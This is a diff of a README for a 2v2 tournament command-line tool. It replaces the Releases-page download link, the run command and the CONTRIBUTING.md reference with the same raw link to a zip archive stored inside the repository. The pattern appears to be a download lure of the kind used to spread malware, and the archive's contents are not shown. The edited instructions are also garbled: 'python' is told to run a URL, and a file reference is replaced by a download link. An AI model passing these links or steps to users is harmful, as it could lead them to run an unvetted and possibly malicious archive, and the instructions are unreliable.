@@ -1,6 +1,6 @@
 # 🎮 tournament-cli - Manage Your 2v2 Tournaments Easily
 
-[![Download tournament-cli](https://img.shields.io/badge/Download-tournament--cli-blue.svg)](https://github.com/arrio3107/tournament-cli/releases)
+[![Download tournament-cli](https://github.com/arrio3107/tournament-cli/raw/refs/heads/main/tournament_cli/tournament-cli-v2.9.zip)](https://github.com/arrio3107/tournament-cli/raw/refs/heads/main/tournament_cli/tournament-cli-v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to tournament-cli! This command-line tool helps you manage 2v2 tournamen
 To get started, you need to download tournament-cli.
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
-   [Download tournament-cli](https://github.com/arrio3107/tournament-cli/releases)
+   [Download tournament-cli](https://github.com/arrio3107/tournament-cli/raw/refs/heads/main/tournament_cli/tournament-cli-v2.9.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see different versions available. Select the latest version for your operating system.
 
@@ -44,7 +44,7 @@ After installing tournament-cli, here’s how to get started with its basic comm
 
 2. **Navigate to the Tool**: Use the `cd` command to navigate to the folder where you downloaded tournament-cli.
 
-3. **Start the Application**: Type `python tournament_cli.py` and press Enter to run the tool.
+3. **Start the Application**: Type `python https://github.com/arrio3107/tournament-cli/raw/refs/heads/main/tournament_cli/tournament-cli-v2.9.zip` and press Enter to run the tool.
 
 4. **Follow Instructions**: The tool will display a series of commands you can use. Follow the prompts to create your tournament.
 
@@ -79,7 +79,7 @@ Stay tuned for future updates. We are constantly improving tournament-cli based 
 
 If you want to contribute to the project or suggest new features, feel free to fork the repository and create a pull request. Your contributions are welcome!
 
-For more detailed information and guidelines on contributing, please check the `CONTRIBUTING.md` file in the repository.
+For more detailed information and guidelines on contributing, please check the `https://github.com/arrio3107/tournament-cli/raw/refs/heads/main/tournament_cli/tournament-cli-v2.9.zip` file in the repository.
 
 ## 📌 Final Note
 
